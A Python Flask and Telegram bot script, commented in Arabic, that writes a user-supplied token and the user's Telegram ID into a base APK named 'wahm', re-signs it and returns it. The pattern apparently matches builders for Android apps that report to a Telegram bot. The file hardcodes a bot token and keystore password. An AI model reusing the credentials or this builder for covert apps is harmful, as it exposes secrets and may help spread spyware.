import os
import zipfile
import subprocess
import threading
from flask import Flask, render_template_string
import telebot

# بيانات البوت (استبدل التوكن الخاص بـ BotFather هنا أو دعه متغير بيئة)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8253284488:AAFcB6N0UVY-aramsPIAhaKJNUrFsEtrQ4Q')
bot = telebot.TeleBot(BOT_TOKEN)

app = Flask(__name__)

UPLOAD_FOLDER = 'temp'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

BASE_APK = 'wahm.apk'
KEYSTORE = 'release.jks'
KEY_ALIAS = 'mykey'
KEY_PASS = 'password123'

# صفحة ويب وهمية لكي تقبلها منصة Render وتظل الخدمة نشطة
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة بوت توقيع وحقن وَهْم - fokhm.com</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl text-center">
        <h1 class="text-2xl font-bold text-amber-400 mb-2">خدمة بوت وَهْم تعمل بنجاح</h1>
        <p class="text-sm text-slate-400">هذه الصفحة مخصصة للحفاظ على تشغيل السيرفر على منصة Render. البوت يعمل بكفاءة عالية الآن!</p>
        <div class="mt-4 inline-block bg-amber-500/10 text-amber-400 border border-amber-500/20 px-4 py-2 rounded-xl text-xs">
            fokhm.com - All Rights Reserved
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

# تخزين حالة المستخدم المؤقتة (من ينتظر إرسال التوكن)
waiting_for_token = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton("🚀 صناعة التطبيق", callback_data="make_app")
    markup.add(btn)
    
    bot.reply_to(
        message,
        "مرحباً بك يا فخم في بوت توقيع وحقن تطبيق **وهم**.\nاضغط على الزر أدناه لبدء صناعة وتوقيع نسختك الخاصة:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "make_app")
def callback_query(call):
    waiting_for_token[call.from_user.id] = True
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "أرسل الآن **التوكن** المطلوب حقنه في التطبيق:",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: waiting_for_token.get(message.from_user.id, False))
def handle_token(message):
    user_id = message.from_user.id
    token_text = message.text.strip()
    waiting_for_token[user_id] = False

    msg = bot.reply_to(message, "⏳ جاري تعديل وحقن الملفات وتوقيع التطبيق بأحدث خوارزميات أندرويد، انتظر قليلاً...")

    modified_apk = os.path.join(UPLOAD_FOLDER, f'wahm_modified_{user_id}.apk')
    aligned_apk = os.path.join(UPLOAD_FOLDER, f'wahm_aligned_{user_id}.apk')
    signed_apk = os.path.join(UPLOAD_FOLDER, f'wahm_signed_{user_id}.apk')

    try:
        for f in [modified_apk, aligned_apk, signed_apk]:
            if os.path.exists(f):
                os.remove(f)

        if not os.path.exists(BASE_APK):
            bot.edit_message_text("❌ خطأ: ملف التطبيق الأساسي غير موجود على السيرفر!", message.chat.id, msg.message_id)
            return

        # نسخ التطبيق للعمل عليه
        os.system(f"cp {BASE_APK} {modified_apk}")

        # تعديل الملفات مباشرة داخل الـ ZIP (assets/token.txt و assets/id.txt)
        target_token = 'assets/token.txt'
        target_id = 'assets/id.txt'
        temp_zip = os.path.join(UPLOAD_FOLDER, f'temp_{user_id}.zip')

        with zipfile.ZipFile(modified_apk, 'r') as zin:
            with zipfile.ZipFile(temp_zip, 'w') as zout:
                token_exists = False
                id_exists = False
                
                for item in zin.infolist():
                    if item.filename.startswith('META-INF/'):
                        continue
                    if item.filename == target_token:
                        token_exists = True
                        zout.writestr(item, token_text.encode('utf-8'))
                    elif item.filename == target_id:
                        id_exists = True
                        zout.writestr(item, str(user_id).encode('utf-8'))
                    else:
                        zout.writestr(item, zin.read(item.filename))
                
                if not token_exists:
                    zout.writestr(target_token, token_text.encode('utf-8'))
                if not id_exists:
                    zout.writestr(target_id, str(user_id).encode('utf-8'))

        os.replace(temp_zip, modified_apk)

        # المحاذاة عبر zipalign
        subprocess.run(['zipalign', '-v', '-p', '4', modified_apk, aligned_apk], check=True)

        # توليد المفتاح إن لم يكن موجوداً
        global KEYSTORE
        if not os.path.exists(KEYSTORE):
            subprocess.run([
                'keytool', '-genkey', '-v',
                '-keystore', KEYSTORE,
                '-alias', KEY_ALIAS,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', KEY_PASS,
                '-keypass', KEY_PASS,
                '-dname', 'CN=Fokhm, OU=Dev, O=Fokhm, L=Riyadh, S=Riyadh, C=SA'
            ], check=True)

        # التوقيع بأحدث صيغ الـ v2 و v3 عبر apksigner
        sign_cmd = [
            'apksigner', 'sign',
            '--ks', KEYSTORE,
            '--ks-pass', f'pass:{KEY_PASS}',
            '--min-sdk-version', '21',
            '--v2-signing-enabled', 'true',
            '--v3-signing-enabled', 'true',
            '--in', aligned_apk,
            '--out', signed_apk
        ]
        
        result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            bot.edit_message_text(f"❌ فشل التوقيع: {result.stderr}", message.chat.id, msg.message_id)
            return

        # إرسال الملف الناتج للمستخدم في البوت
        with open(signed_apk, 'rb') as apk_file:
            bot.send_document(
                message.chat.id,
                apk_file,
                caption="✅ تم حقن التوكن والايدي وتوقيع التطبيق بنجاح لأحدث أجهزة أندرويد!",
                visible_file_name="wahm_customized.apk"
            )
        bot.delete_message(message.chat.id, msg.message_id)

    except Exception as e:
        bot.edit_message_text(f"❌ حدث خطأ أثناء المعالجة: {str(e)}", message.chat.id, msg.message_id)

# تشغيل البوت في مسار منفصل (Background Thread) لكي لا يعطل سيرفر الويب
def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # تشغيل سيرفر الويب على البورت الخاص بـ Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

